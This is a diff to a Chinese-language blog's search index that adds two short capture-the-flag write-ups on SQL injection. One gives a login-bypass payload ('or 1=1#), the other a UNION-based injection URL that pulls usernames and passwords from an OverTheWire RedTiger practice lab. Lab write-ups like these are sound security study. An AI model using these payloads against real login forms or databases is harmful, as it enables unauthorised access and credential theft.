@@ -1,6 +1,41 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SQL注入第二题</title>
+    <url>/2019/12/15/SQL%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%BA%8C%E9%A2%98/</url>
+    <content><![CDATA[<h3 id="SQL注入第二题"><a href="#SQL注入第二题" class="headerlink" title="SQL注入第二题"></a>SQL注入第二题</h3><p>根据题意 可以知道  这个是万能钥匙题</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/SQL注入 第二题1.png" alt="根据题意"></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/SQL注入 第二题2.png" alt="结果返回"></p>
+<p><code>username=admin&#39; or &#39;1&#39;=&#39;1&amp;password=&#39;or 1=1#&amp;login=Login</code></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入第一题</title>
+    <url>/2019/12/14/SQL%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%80%E9%A2%98/</url>
+    <content><![CDATA[<h3 id="SQL注入-第一题"><a href="#SQL注入-第一题" class="headerlink" title="SQL注入 第一题"></a>SQL注入 第一题</h3><p>根据题目意思 我们会发现注入点 在URL   然后</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/SQL注入 第一题1.png" alt="爆字段"></p>
+<p>根据步骤</p>
+<p>先确定 字段位、显示位、爆字段、联合查询</p>
+<p>最后确定了结果</p>
+<p><code>https://redtiger.labs.overthewire.org/level1.php?cat=-1 union select 1,2,username,password from level1_users#</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/SQL注入 第一题2.png" alt="结果返回"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>猫舍SQL注入</title>
     <url>/2019/12/13/%E7%8C%AB%E8%88%8DSQL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="查看是否有SQL注入漏洞"><a href="#查看是否有SQL注入漏洞" class="headerlink" title="查看是否有SQL注入漏洞"></a>查看是否有SQL注入漏洞</h4><p><img src="http://q20wi1s2d.bkt.clouddn.com/判断是否有SQL注入.png" alt="这次的目标"></p>
@@ -433,8 +468,8 @@
         <category>吃饭</category>
       </categories>
       <tags>
-        <tag>渗透</tag>
         <tag>burp</tag>
+        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
